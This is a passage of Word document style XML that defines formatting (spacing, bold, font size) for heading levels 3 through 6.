    </w:rPr>
  </w:style>
  <w:style w:type="paragraph" w:styleId="Heading3">
    <w:name w:val="heading 3"/>
    <w:basedOn w:val="Normal"/>
    <w:next w:val="Normal"/>
    <w:pPr>
      <w:keepNext w:val="0"/>
      <w:keepLines w:val="0"/>
      <w:widowControl w:val="0"/>
      <w:spacing w:after="80" w:before="280" w:line="240" w:lineRule="auto"/>
    </w:pPr>
    <w:rPr>
      <w:b w:val="1"/>
      <w:smallCaps w:val="0"/>
      <w:sz w:val="28"/>
      <w:szCs w:val="28"/>
    </w:rPr>
  </w:style>
  <w:style w:type="paragraph" w:styleId="Heading4">
    <w:name w:val="heading 4"/>
    <w:basedOn w:val="Normal"/>
    <w:next w:val="Normal"/>
    <w:pPr>
      <w:keepNext w:val="0"/>
      <w:keepLines w:val="0"/>
      <w:widowControl w:val="0"/>
      <w:spacing w:after="40" w:before="240" w:line="240" w:lineRule="auto"/>
    </w:pPr>
    <w:rPr>
      <w:b w:val="1"/>
      <w:smallCaps w:val="0"/>
      <w:sz w:val="24"/>
      <w:szCs w:val="24"/>
    </w:rPr>
  </w:style>
  <w:style w:type="paragraph" w:styleId="Heading5">
    <w:name w:val="heading 5"/>
    <w:basedOn w:val="Normal"/>
    <w:next w:val="Normal"/>
    <w:pPr>
      <w:keepNext w:val="0"/>
      <w:keepLines w:val="0"/>
      <w:widowControl w:val="0"/>
      <w:spacing w:after="40" w:before="220" w:line="240" w:lineRule="auto"/>
    </w:pPr>
    <w:rPr>
      <w:b w:val="1"/>
      <w:smallCaps w:val="0"/>
    </w:rPr>
  </w:style>
  <w:style w:type="paragraph" w:styleId="Heading6">
    <w:name w:val="heading 6"/>
    <w:basedOn w:val="Normal"/>
    <w:next w:val="Normal"/>
    <w:pPr>
      <w:keepNext w:val="0"/>
      <w:keepLines w:val="0"/>
      <w:widowControl w:val="0"/>
      <w:spacing w:after="40" w:before="200" w:line="240" w:lineRule="auto"/>
    </w:pPr>
    <w:rPr>
      <w:b w:val="1"/>
      <w:smallCaps w:val="0"/>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